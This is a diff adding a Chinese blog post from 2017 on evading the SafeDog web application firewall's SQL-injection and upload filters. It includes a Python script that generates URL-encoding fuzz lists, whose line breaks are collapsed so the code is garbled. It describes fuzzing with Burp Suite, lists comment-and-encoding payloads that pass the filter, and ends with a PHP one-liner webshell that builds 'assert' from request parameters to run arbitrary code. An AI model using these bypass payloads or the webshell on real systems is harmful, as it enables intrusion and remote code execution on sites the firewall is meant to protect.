@@ -1,0 +1,46 @@
+---
+layout:     post
+title:     Bypass 安全狗防注入、防上传等
+subtitle:   Bypass 安全狗防注入、防上传等
+date:       2017-06-06
+author:     BY
+header-img: img/post-bg-ios9-web.jpg
+catalog: true
+tags:
+    - 安全狗防注入
+    - 防上传
+---
+# 前言
+
+过注入这个很多人都发过了，但都是授人以鱼，只给你payload不告诉怎么fuzz出来的，没有学习价值，也不具备可复制性，因为payload一旦发出来很快就会被和谐。
+关于过狗通常的姿势都是:
+1.sql注释
+2.url编码
+3.符号
+4.畸形http包
+5.截断
+6.请求方式
+我的思路是使用sql注释+符号+url编码，注释只能使用多行注释:/**/。url编码有2种组合:
+数字和数字组合如:%57，%27，
+数字和字母组合:%2a
+为了增加绕过的可能性，我又分别加了字母和数字组合字母和字母组合(大小写)
+符号就用一些常规的符号如:!@*&等
+编写生成所有url编码组合的字典:
+#!/use/bin/python# -*- coding:utf-8 -*- -def f(i):   f=open('0a.txt','a')   f.write(i)   f.close()for i in range(0,10):  for y in range(0,10):     c = str(i)+str(y)     f("%%%s\n"%(c))#数字和数字正序倒叙组合c = 'qwertyuiopasdfghjklzxcvbnm'for y in range(0,10):  for i in c:     c = str(i)+str(y)     t = str(i)+str(y)     f("%%%s\n"%(c))     f("%%%s\n"%(t))#字母和数字x = 'QWERTYUIOPASDFGHJKLZXCVBNM'for y in range(0,10):  for i in x:     c = str(i)+str(y)     t = str(y)+str(i)     f("%%%s\n"%(c))     f("%%%s\n"%(t))#大写字母和数字for i in x:  for y in x:     c = str(i)+str(y)     f("%%%s\n"%(c))#大写字母和字母for i in c:  for y in x:     c = str(i)+str(y)     t = str(y)+str(i)     f("%%%s\n"%(c))     f("%%%s\n"%(t))
+生成结果:
+
+导入burpsuite进行fuzz
+
+分别格式为:注释、符号、编码字典、符号、注释。如:/*@%2a!*/,当然还可以用其他组合，我这里就是举个栗子
+使用Cluster Boom组合出12W出姿势:
+
+大约fuzz出来几千条，拿出来几条:
+/*A**//*!%ID*//*!*%6C*//***%MD*//*!*%4C*//****%6V*//*****%U3*//**!**%68*//**!*!%46*/上传:
+
+换行被拦截了，没关系，再换一行!
+
+成功bypass
+过狗一句话:
+这种东西不是一写一大堆的吗。。有啥好写的。随便丢一个出来。
+<?php$x = $_GET['y'].'ert';$x($_GET['x']);?>
+?y=ass&x=phpinfo()
